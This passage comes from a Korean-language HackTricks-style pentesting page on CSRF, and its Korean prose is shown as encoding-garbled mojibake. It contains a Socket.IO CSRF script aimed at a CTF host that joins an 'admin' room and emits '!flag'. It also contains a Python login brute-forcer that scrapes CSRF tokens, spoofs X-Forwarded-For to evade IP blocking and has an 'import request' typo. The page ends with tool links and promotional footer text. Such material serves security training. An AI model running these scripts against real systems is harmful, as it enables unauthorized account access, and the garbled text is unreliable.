document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOë¥¼ ì´ìš©í•œ CSRF

Socket.IOëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‹¤ì‹œê°„ ì–‘ë°©í–¥ í†µì‹ ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” JavaScript ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ CSRF(Cross-Site Request Forgery) ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

CSRF ê³µê²©ì€ ì¸ì¦ëœ ì‚¬ìš©ìì˜ ê¶Œí•œì„ ì´ìš©í•˜ì—¬ ì•…ì˜ì ì¸ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê³µê²©ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì‚¬ìš©ìì˜ ê³„ì •ì„ ì´ìš©í•˜ì—¬ ì•…ì˜ì ì¸ ë™ì‘ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Socket.IOë¥¼ ì´ìš©í•œ CSRF ê³µê²©ì€ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¡œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤:

1. ê³µê²©ìëŠ” ì•…ì„± ì›¹ í˜ì´ì§€ë¥¼ ìƒì„±í•˜ì—¬ Socket.IO í´ë¼ì´ì–¸íŠ¸ë¥¼ í¬í•¨ì‹œí‚µë‹ˆë‹¤.
2. ì•…ì„± ì›¹ í˜ì´ì§€ë¥¼ í”¼í•´ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì ‘ì†í•œ ì‚¬ìš©ìëŠ” Socket.IO í´ë¼ì´ì–¸íŠ¸ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.
3. Socket.IO í´ë¼ì´ì–¸íŠ¸ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ì˜ ì—°ê²°ì„ ì„¤ì •í•˜ê³  ì¸ì¦ í† í°ì„ ë°›ìŠµë‹ˆë‹¤.
4. ê³µê²©ìëŠ” ì•…ì„± ìš”ì²­ì„ í¬í•¨í•œ Socket.IO íŒ¨í‚·ì„ ìƒì„±í•©ë‹ˆë‹¤.
5. ì•…ì„± ìš”ì²­ì„ í¬í•¨í•œ Socket.IO íŒ¨í‚·ì„ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì „ì†¡í•©ë‹ˆë‹¤.
6. ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ Socket.IO íŒ¨í‚·ì„ ì²˜ë¦¬í•˜ê³  ì•…ì„± ìš”ì²­ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ ê³µê²©ìëŠ” ì‚¬ìš©ìì˜ ì¸ì¦ëœ ì„¸ì…˜ì„ ì´ìš©í•˜ì—¬ ì•…ì˜ì ì¸ ë™ì‘ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê°œë°œìëŠ” Socket.IOë¥¼ ì‚¬ìš©í•  ë•Œ CSRF ê³µê²©ì— ëŒ€ë¹„í•˜ì—¬ ì ì ˆí•œ ë³´í˜¸ ë©”ì»¤ë‹ˆì¦˜ì„ êµ¬í˜„í•´ì•¼ í•©ë‹ˆë‹¤.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF ë¡œê·¸ì¸ ë¸Œë£¨íŠ¸ í¬ìŠ¤

ì´ ì½”ë“œëŠ” CSRF í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ì¸ í¼ì„ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë˜í•œ ê°€ëŠ¥í•œ IP ë¸”ë™ë¦¬ìŠ¤íŠ¸ ìš°íšŒë¥¼ ìœ„í•´ í—¤ë” X-Forwarded-Forë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ë„êµ¬ <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## ì°¸ê³  ìë£Œ

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ ë§ì€ í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì„ ë‹¤ë£¨ëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ê°€ì…í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
